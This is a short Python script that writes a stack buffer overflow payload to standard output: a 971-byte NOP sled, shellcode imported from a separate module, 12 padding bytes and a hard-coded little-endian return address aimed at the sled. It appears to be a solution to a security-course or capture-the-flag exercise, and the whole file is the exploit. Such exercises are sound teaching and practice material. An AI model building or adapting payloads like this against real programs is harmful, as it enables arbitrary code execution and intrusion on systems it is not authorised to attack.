from shellcode import shellcode
import sys
sys.stdout.buffer.write(b"\x90"*971)
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b"\x61"*12)
sys.stdout.buffer.write(0xfff6a910.to_bytes(4,"little"))
